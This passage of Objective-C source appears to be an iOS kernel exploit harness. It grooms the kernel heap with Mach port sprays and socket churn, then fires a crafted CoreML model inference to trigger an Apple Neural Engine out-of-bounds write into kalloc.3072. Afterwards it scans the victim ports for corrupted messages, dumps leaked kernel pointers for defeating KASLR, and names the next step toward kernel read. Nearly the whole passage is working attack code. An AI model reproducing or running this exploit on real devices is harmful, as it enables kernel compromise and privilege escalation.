    [out appendFormat:@"v27: portkind-diff engine; NEON_WITNESS_COUNT=%u PORT_VICTIM_EVERY=%u P044_CONTROL_RECV=%d.\n",
        (unsigned)NEON_WITNESS_COUNT, (unsigned)PORT_VICTIM_EVERY, (int)P044_CONTROL_RECV];
    [out appendString:@"NEON witness is a transport overlay. NOT KRW. NOT hasKread.\n\n"];

    pthread_mutex_lock(&g_evLock);
    g_evCount = 0;
    g_evTotal = 0;
    memset(g_events, 0, sizeof(g_events));
    pthread_mutex_unlock(&g_evLock);

    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p044"];
    if (stop) { [out appendString:stop]; p044_write_log(out); return out; }
    [out appendString:[LabDeviceProfile identBlock]];
    p044_write_log(out);

    // 1. Find model
    NSURL *modelURL = [self findCoreMLModelURL:out];
    if (!modelURL) { p044_write_log(out); return out; }

    // 1b. model-name guard (log only, no abort)
    if ([COREML_MODEL_NAME rangeOfString:@"addchain"].location == NSNotFound) {
        [out appendFormat:@"  MODEL-NOTE: name '%@' has no 'addchain' — verdict FLAG disabled\n",
            COREML_MODEL_NAME];
    } else {
        [out appendFormat:@"  MODEL-NOTE: addchain model confirmed ('%@')\n", COREML_MODEL_NAME];
    }
    p044_write_log(out);

    // 2. Load model
    MLModel *model = [self loadCoreMLModel:modelURL out:out];
    if (!model) { p044_write_log(out); return out; }

    // 3. Create features
    MLDictionaryFeatureProvider *provider = [self createFeatures:out];
    if (!provider) { p044_write_log(out); return out; }

    // 4. Start heap churn BEFORE spray
    [out appendString:@"\n=== PHASE 4c: heap churn seed (LuminaKRW effect) ===\n"];
    struct rlimit rl = { 0x10000, 0x10000 };
    setrlimit(RLIMIT_NOFILE, &rl);
    g_churn_go = 1;
    pthread_t churnTid;
    pthread_create(&churnTid, NULL, churn_worker, NULL);
    [NSThread sleepForTimeInterval:CHURN_SETTLE_SEC];
    [out appendFormat:@"  churn running (%d-socket create/close loop)\n", CHURN_BATCH];
    p044_write_log(out);

    // 5. Spray
    mach_port_t *drain = NULL;
    pair_t *pairs = [self sprayOut:out drain:&drain];
    if (!pairs || !drain) {
        [out appendString:@"  STOP: Spray failed\n"];
        g_churn_go = 0;
        pthread_join(churnTid, NULL);
        p044_write_log(out);
        return out;
    }
    p044_write_log(out);

    // 5b. NEON witnesses after spray, before fire
    [out appendString:@"\n=== PHASE 4d: NEON witnesses (96 threads, V0..V31 magic) ===\n"];
    [self startWitnesses:out];
    p044_write_log(out);

    [out appendString:@"\n=== PHASE 4e: NEON control scan (pre-fire, expect all-match) ===\n"];
    [self neon_scan:out tag:@"control-pre-fire"];
    p044_write_log(out);

#if P044_CONTROL_RECV
    [out appendString:@"\n=== PHASE 4f: control recv (one port-kind victim, pre-fire) ===\n"];
    [self controlRecv:pairs out:out];
    p044_write_log(out);
#else
    [out appendString:@"\n=== PHASE 4f: control recv DISABLED (P044_CONTROL_RECV=0) ===\n"];
    p044_write_log(out);
#endif

    // 6. FIRE
    [out appendString:@"\n=== PHASE 5: FIRE — CoreML inference (254 inputs) ===\n"];
    [out appendString:@">>> FIRING predictionFromFeatures with 254 inputs <<<\n"];
    [out appendString:@">>> ANE CheckandPrewire OOB write into kalloc.3072 <<<\n"];
    [out appendString:@">>> PANIC POSSIBLE — ips will have KASLR <<<\n\n"];
    p044_write_log(out);

    NSError *err = nil;
    id<MLFeatureProvider> prediction = [model predictionFromFeatures:provider error:&err];

    if (prediction) {
        [out appendString:@"  inference ok — prediction returned (UNEXPECTED with addchain — check model)\n"];
    } else {
        [out appendFormat:@"  prediction FAILED: %@ (code=%ld) — EXPECTED with addchain\n",
            err ? err.localizedDescription : @"<nil>", err ? (long)err.code : 0L];
    }
    [out appendFormat:@"  prediction_status=%s\n", prediction ? "OK" : "FAILED"];
    p044_write_log(out);

    [out appendString:@"\n=== PHASE 5c: NEON scan t+0 ===\n"];
    int neonPost = [self neon_scan:out tag:@"t+0"];
    p044_write_log(out);

    // 7. Immediate victim scan (t+0)
    [out appendString:@"\n=== PHASE 6: Immediate victim scan (t+0) ===\n"];
    int hits = [self scanVictims:pairs out:out];
    [out appendFormat:@"  t+0 victim hits=%d\n", hits];
    if (!prediction) {
        if (hits > 0) {
            [out appendFormat:@"  NOTE: prediction FAILED but OOB signals present (hits=%d) — inference failure may be a corruption effect.\n", hits];
        } else {
            [out appendString:@"  NOTE: prediction FAILED and no t+0 signals yet — see watcher window.\n"];
        }
    }
    p044_write_log(out);

    // 8. Stop churn, start late watcher over the queued drains
    g_churn_go = 0;
    pthread_join(churnTid, NULL);
    [out appendString:@"  churn stopped\n"];
    p044_write_log(out);

    g_watchDrain = drain;
    g_watchScanned = calloc(DRAIN_COUNT, 1);
    pthread_t watchTid;
    BOOL watcherStarted = NO;
    if (g_watchScanned) {
        g_watch_go = 1;
        if (pthread_create(&watchTid, NULL, watch_worker, NULL) == 0) {
            watcherStarted = YES;
        } else {
            g_watch_go = 0;
        }
    }

    if (watcherStarted) {
        [out appendFormat:@"\n=== PHASE 6b: late watcher running for %.0fs (delayed landings) ===\n",
            WATCH_SECONDS];
        p044_write_log(out);
        int ticks = (int)(WATCH_SECONDS / 5.0);
        for (int t = 0; t < ticks; t++) {
            [NSThread sleepForTimeInterval:5.0];
            neonPost += [self neon_scan:out tag:[NSString stringWithFormat:@"watch+%ds", (t + 1) * 5]];
            p044_write_log(out);
        }
        g_watch_go = 0;
        pthread_join(watchTid, NULL);
        pthread_mutex_lock(&g_evLock);
        int evc = g_evTotal;
        int evStored = g_evCount;
        pthread_mutex_unlock(&g_evLock);
        [out appendFormat:@"  watcher events=%d (stored=%d)\n", evc, evStored];
        p044_write_log(out);
    }

    [out appendString:@"\n=== PHASE 6c: NEON scan end ===\n"];
    neonPost += [self neon_scan:out tag:@"end"];
    p044_write_log(out);

    // 9. Detailed event dump
    [out appendString:@"\n=== EVENTS ===\n"];
    pthread_mutex_lock(&g_evLock);
    [out appendFormat:@"  captured=%d stored=%d (cap %d)\n", g_evTotal, g_evCount, EVENT_LOG_MAX];
    for (int e = 0; e < g_evCount; e++) {
        ev_t *ev = &g_events[e];
        switch (ev->kind) {
            case 1:
                [out appendFormat:@"  *** PORT-KIND SIGNAL victim=%u recv kr=0x%x corrupt_msgh_size=0x%x ***\n",
                    ev->idx, ev->kr, ev->corruptSize];
                break;
            case 2:
                [out appendFormat:@"  DRAIN-HIT drain=%u (LATE LANDING, inline corrupted)\n", ev->idx];
                hexdump16(ev->body, 0, out);
                kptr_scan(ev->body, ev->idx, out);
                break;
            case 3:
                [out appendFormat:
                    @"  *** PORT-KIND SIGNAL drain=%u recv kr=0x%x corrupt_msgh_size=0x%x — KERNEL REJECTED CORRUPTED DESCRIPTORS ***\n",
                    ev->idx, ev->kr, ev->corruptSize];
                break;
            case 4:
                [out appendFormat:
                    @"  *** INLINE-REJECTION victim=%u recv kr=0x%x corrupt_msgh_size=0x%x ***\n",
                    ev->idx, ev->kr, ev->corruptSize];
                break;
            case 5:
                [out appendFormat:@"  *** PORT-KIND HIT victim=%u (payload diff, see HIT line) ***\n", ev->idx];
                break;
            default:
                break;
        }
    }
    pthread_mutex_unlock(&g_evLock);
    p044_write_log(out);

    // VERDICT
    [out appendString:@"\n=== VERDICT ===\n"];
    [out appendFormat:@"  prediction_status=%s  t+0_hits=%d  neon_postfire=%d  events_total=%d\n",
        prediction ? "OK" : "FAILED", hits, neonPost, g_evTotal];
    if ((prediction != nil) &&
        [COREML_MODEL_NAME rangeOfString:@"addchain"].location != NSNotFound) {
        [out appendString:@"\n*** MODEL FLAG: addchain model but prediction SUCCEEDED (unexpected) ***\n"];
    }
    if (hits > 0) {
        [out appendString:@"\n*** OOB WRITE CONFIRMED ***\n"];
        [out appendString:@"Fingerprint: [u32 surfaceId][u32 0xcN counter][1][1], 16B stride.\n"];
        [out appendString:@"KPTR lines above = LEAK (slide = val - unslid pin). hasKread path.\n"];
        [out appendString:@"PORT-KIND SIGNALS above = kernel consumed corrupted descriptors.\n"];
        [out appendString:@"INLINE-REJECTION (kind 4) = inline kmsg size/desc rejected.\n"];
        [out appendString:@"NEON-WITNESS HIT = fill touched a thread NEON save area (transport candidate). Not hasKread.\n"];
        [out appendString:@"Next: KPTR -> slide math + commitSlide only after kread32(kbase)==MH_MAGIC_64.\n"];
    } else if (g_evTotal > 0) {
        [out appendString:@"\n*** LATE-WINDOW EVENT CONFIRMED (watcher) ***\n"];
        [out appendString:@"Write lands after the tap's synchronous window — timing, not occupancy.\n"];
    } else if (neonPost > 0) {
        [out appendString:@"\n*** NEON-WITNESS post-fire mismatch with no kmsg hits ***\n"];
        [out appendString:@"Thread NEON state moved; kalloc.3072 victims quiet. Not hasKread.\n"];
    } else if (prediction) {
        [out appendString:@"\nInference succeeded but no corruption detected.\n"];
    } else {
        [out appendString:@"\nNo corruption in the observation window.\n"];
        [out appendString:@"prediction FAILED and no kmsg/NEON signals — see prediction_status.\n"];
    }

    // Cleanup
    [out appendString:@"\n\n=== CLEANUP ===\n"];
    [self stopWitnesses];
    for (uint32_t i = 0; i < DRAIN_COUNT; i++) {
        if (drain[i]) {
            if (!g_watchScanned || !g_watchScanned[i]) {
                recv_msg(drain[i], NULL, RECV_WAIT_MS_EMPTY);
            }
            mach_port_destroy(mach_task_self(), drain[i]);
        }
    }
    for (uint32_t i = 0; i < PAIR_COUNT; i++) {
        if (pairs[i].victim) {
            if (!pairs[i].done) {
                recv_msg(pairs[i].victim, NULL, RECV_WAIT_MS_EMPTY);
            }
            mach_port_destroy(mach_task_self(), pairs[i].victim);
        }
        if (pairs[i].hole) mach_port_destroy(mach_task_self(), pairs[i].hole);
    }
    free(pairs);
    free(drain);
    if (g_watchScanned) {
        free(g_watchScanned);
        g_watchScanned = NULL;
    }
    g_watchDrain = NULL;
    [out appendString:@"  cleanup done (witnesses joined)\n"];

    p044_write_log(out);
    return out;
}

@end
